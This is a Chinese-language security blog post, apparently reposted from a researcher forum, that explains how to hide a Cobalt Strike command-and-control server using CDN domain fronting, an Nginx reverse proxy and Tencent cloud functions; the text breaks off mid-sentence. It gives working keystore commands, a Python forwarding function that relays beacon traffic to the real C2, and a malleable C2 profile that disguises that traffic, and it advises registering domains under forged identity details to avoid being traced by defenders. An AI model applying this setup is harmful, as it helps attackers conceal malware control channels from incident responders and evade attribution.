---
title: C2隐匿-云函数&域前置
url: https://buaq.net/go-170233.html
source: unSafe.sh - 不安全
date: 2023-06-26
fetch_date: 2025-10-04T11:45:02.123178
---

# C2隐匿-云函数&域前置

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/7f43c7f1c8ae4b4c9d9c3f054abedbc6.jpg)

C2隐匿-云函数&域前置

域前置简单的说CDN,它其实就是一种分布式缓存服务器,用于存放一些静态资源(图片,html,css,js,视频)等资源,来达到缩短响应时间的目的,一些动态的数据是
*2023-6-25 17:32:0
Author: [xz.aliyun.com(查看原文)](/jump-170233.htm)
阅读量:48
收藏*

---

## 域前置

简单的说CDN,它其实就是一种分布式缓存服务器,用于存放一些静态资源(图片,html,css,js,视频)等资源,来达到缩短响应时间的目的,一些动态的数据是从源站中获取,也就是说,当用户访问一个挂有cdn的域名,**响应结果**=**cdn节点上的缓存的静态资源**+**源站的动态数据**

### HTTP

首先获取一个免备案的域名(免不免备案都行是个域名就行,这不是怕蓝队获取到你域名,查备案,直接定位到你,没备案或备案人不是你的域名也行),这里推荐<https://porkbun.com>(国外站点,)

接着这里我用的是阿里云厂商的CDN服务,你也可以使用其他的,不知道咋回事开通cdn,阿里云收费0元,于是就试着做域前置
首先我们在阿里云的CDN控制器上配置
![](https://xzfile.aliyuncs.com/media/upload/picture/20230625173236-388806fa-133b-1.png)
复制给的记录值
![](https://xzfile.aliyuncs.com/media/upload/picture/20230625173237-38b8d208-133b-1.png)
然后在域名管理处添加这条记录
![](https://xzfile.aliyuncs.com/media/upload/picture/20230625173237-38f2166c-133b-1.png)
然后多地ping一下这个域名,看看返回ip
![](https://xzfile.aliyuncs.com/media/upload/picture/20230625173237-392e0fa0-133b-1.png)
(很明显生效了)
接下来配置一下**回源主站**
**这一步告诉cdn节点服务器,到源站那些端口取数据**
![](https://xzfile.aliyuncs.com/media/upload/picture/20230625173238-396391f2-133b-1.png)
![](https://xzfile.aliyuncs.com/media/upload/picture/20230625173238-39903d38-133b-1.png)
接着配置一下cs监听器即可
![](https://xzfile.aliyuncs.com/media/upload/picture/20230625173238-39c1c0ec-133b-1.png)
生成木马测试
![](https://xzfile.aliyuncs.com/media/upload/picture/20230625173239-39fca216-133b-1.png)
![](https://xzfile.aliyuncs.com/media/upload/picture/20230625173239-3a24f6da-133b-1.png)
看一下这个建立连接的IP
![](https://xzfile.aliyuncs.com/media/upload/picture/20230625173239-3a52597c-133b-1.png)
(**我的cs真实ip为101开头的,很明显,是cdn节点建立的连接**)
**流量设备也查不到任何与cs的真实ip通信记录,全是与cdn节点建立的联系**

### HTTPS

<https://mp.weixin.qq.com/s/pplSydk68JxlmkKz94t__w>
这种方式更安全,你的域名不会被流量设备查到,内容是加密的

首先,去申请一下来一个SSL证书,这里阿里云可以免费申请
![](https://xzfile.aliyuncs.com/media/upload/picture/20230625173240-3a8ef51c-133b-1.png)
(申请过程,按官方文档走,就行了)
申请成功之后,下载你的公钥与私钥
![](https://xzfile.aliyuncs.com/media/upload/picture/20230625173240-3ac6b8a8-133b-1.png)
后缀为.pem表示公钥
后缀为.key表示私钥(保管好,别泄漏了)
接着使用命令
**生成c2证书**

```
openssl pkcs12 -export -in 公钥文件 -inkey 私钥文件 -out cs.store -name test_cert -passout pass:设置密码
```

**创建store文件**

```
keytool -importkeystore -deststorepass 设置密码 -destkeypass 设置密码 -destkeystore cscert.store -srckeystore cs.store -srcstoretype PKCS12 -srcstorepass 设置密码 -alias test_cert
```

(设置的所有密码,保持同一个)
接着将生成的cscert.store文件,复制到cs服务端的根目录下
然后修改一下teamserver
![](https://xzfile.aliyuncs.com/media/upload/picture/20230625173240-3af0d322-133b-1.png)
启动即可./teamserver ip 密码

接着为cdn节点添加证书,到阿里云的cdn控制器
![](https://xzfile.aliyuncs.com/media/upload/picture/20230625173241-3b27f3a2-133b-1.png)
![](https://xzfile.aliyuncs.com/media/upload/picture/20230625173241-3b621974-133b-1.png)

### HTTP与HTTPS比对

这里我们比对一下HTTP与HTTPS(均带有cdn)
先看看Http,建立监听的是cdn节点
![](https://xzfile.aliyuncs.com/media/upload/picture/20230625173241-3b93604c-133b-1.png)

![](https://xzfile.aliyuncs.com/media/upload/picture/20230625173242-3bc040c6-133b-1.png)
但是从流量上看
![](https://xzfile.aliyuncs.com/media/upload/picture/20230625173242-3bf70afc-133b-1.png)
(这里不难发现请求头Host,包含了咱们的域名,我的是国外买的域名,而且身份信息都是伪造的,不怕被查,如果你用的是你个人的身份信息备案的域名,来做域前置,ICP备案查询直接能定位到你个人)

下面看看HTTPS
建立监听的是cdn节点
![](https://xzfile.aliyuncs.com/media/upload/picture/20230625173242-3c27d39e-133b-1.png)
流量上看
![](https://xzfile.aliyuncs.com/media/upload/picture/20230625173243-3c684758-133b-1.png)
对比发现,https+域前置隐藏效果更好

## 域前置和Nigix反向代理

<https://www.anquanke.com/post/id/239640>
这里我测试发现,即便设置了CDN回源ip与自定义端口但还是无法上线cs,这里用个Nigix反向代理就能解决.
但是虽然说netstat -ano查不到cs真实ip,但是**这种方式**流量设备能够查到cs真实ip
首先还是得需要一个挂有CDN服务的域名,例如www.a.com
CDN回源ip设成cs真实ip,端口默认80
接着弄Nigix反向代理
![](https://xzfile.aliyuncs.com/media/upload/picture/20230625173243-3c9adcc2-133b-1.png)

```
server {
    listen       80;
    server_name  127.0.0.1;

    location / {
        proxy_pass  http://127.0.0.1:9101;
    }
}
```

接着cs上设置两个监听器
一个
![](https://xzfile.aliyuncs.com/media/upload/picture/20230625173243-3cc8626e-133b-1.png)
另外一个填域名
![](https://xzfile.aliyuncs.com/media/upload/picture/20230625173244-3cfdbfea-133b-1.png)
![](https://xzfile.aliyuncs.com/media/upload/picture/20230625173244-3d2a035c-133b-1.png)
生成木马测试连接
![](https://xzfile.aliyuncs.com/media/upload/picture/20230625173244-3d5a2b90-133b-1.png)
**但是流量设备上能发现,与cs真实ip建立的连接,这种方式是会被发现的**
![](https://xzfile.aliyuncs.com/media/upload/picture/20230625173245-3d7edfe4-133b-1.png)

## 云函数

大致流程这样
创建好云函数之后,返回给你一个域名A

云函数的触发器设置为API模式(访问一个API才交给云函数处理)
用户访问--->域名A---->云函数处理用户请求----->将请求发送给你的真实vps

这里使用的是腾讯云的云函数,配置过程大致如下
![](https://xzfile.aliyuncs.com/media/upload/picture/20230625173245-3db3be30-133b-1.png)
新建一个函数
![](https://xzfile.aliyuncs.com/media/upload/picture/20230625173245-3deb4abc-133b-1.png)
![](https://xzfile.aliyuncs.com/media/upload/picture/20230625173246-3e27c550-133b-1.png)

```
# -*- coding: utf8 -*-
import json,requests,base64
def main_handler(event, context):
    C2='http://csip即端口'  # 修改为自己C2服务器地址
    path=event['path']
    headers=event['headers']

    params=event['queryString']
    print(event)

    if event['httpMethod'] == 'GET' :
        resp=requests.get(C2+path,headers=headers,verify=False,params=params)
    else:
        resp=requests.post(C2+path,data=event['body'],headers=headers,verify=False,params=params)
        print(resp.headers)
        print(resp.content)

    response={
        "isBase64Encoded": True,
        "statusCode": resp.status_code,
        "headers": dict(resp.headers),
        "body": str(base64.b64encode(resp.content))[2:-1]
    }
    return response
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20230625173246-3e632186-133b-1.png)
触发器这样配置即可
![](https://xzfile.aliyuncs.com/media/upload/picture/20230625173246-3ea22e58-133b-1.png)
下面修改一下出发前,使其访问 根目录就触发
![](https://xzfile.aliyuncs.com/media/upload/picture/20230625173247-3ed80b5e-133b-1.png)
![](https://xzfile.aliyuncs.com/media/upload/picture/20230625173247-3f10d538-133b-1.png)
![](https://xzfile.aliyuncs.com/media/upload/picture/20230625173248-3f3d9c6c-133b-1.png)
![](https://xzfile.aliyuncs.com/media/upload/picture/20230625173248-3f7a5cd8-133b-1.png)
下面访问这个链接,就会将转发给我们的cs服务器
![](https://xzfile.aliyuncs.com/media/upload/picture/20230625173248-3fb18c94-133b-1.png)
下面还需要处理一下cs服务器,我们需要自定义一个profile文件,这是因为,云函数在与teamserver通信的时候会进行一些编码操作,对应的我们cs服务器需要对其相应的解码操作,因此需要创建一个profile文件(处理一下数据),cs服务器才能有命令执行成功的回显

```
set sample_name "t";
set sleeptime "3000";
set jitter   "0";
set maxdns   "255";
set useragent "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)";

http-get {

  set uri "/api/x";

  client {
      header "Accept" "*/*";
      metadata {
          base64;
          prepend "SESSIONID=";
          header "Cookie";
      }
  }

  server {
      header "Content-Type" "application/ocsp-response";
      header "content-transfer-encoding" "binary";
      header "Server" "Nodejs";
      output {
          base64;
          print;
      }
  }
}
http-stager {
  set uri_x86 "/vue.min.js";
  set uri_x64 "/bootstrap-2.min.js";
}
http-post {
  set uri "/api/y";
  client {
      header "Accept" "*/*";
      id {
          base64;
          prepend "JSESSION=";
          header "Cookie";
      }
      output {
          base64;
          print;
      }
  }

  server {
      header "Content-Type" "application/ocsp-response";
      header "content-transfer-encoding" "binary";
      header "Connection" "keep-alive";
      output {
          base64;
          print;
      }
  }
}
```

配置如下
在cs根目录下创建yun.txt,内容填充如上
然后输入命令

```
./teamserver ip 密码 yun.txt
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20230625173249-3fe4bb5a-133b-1.png)
cs的监听这样设置
用云函数给你...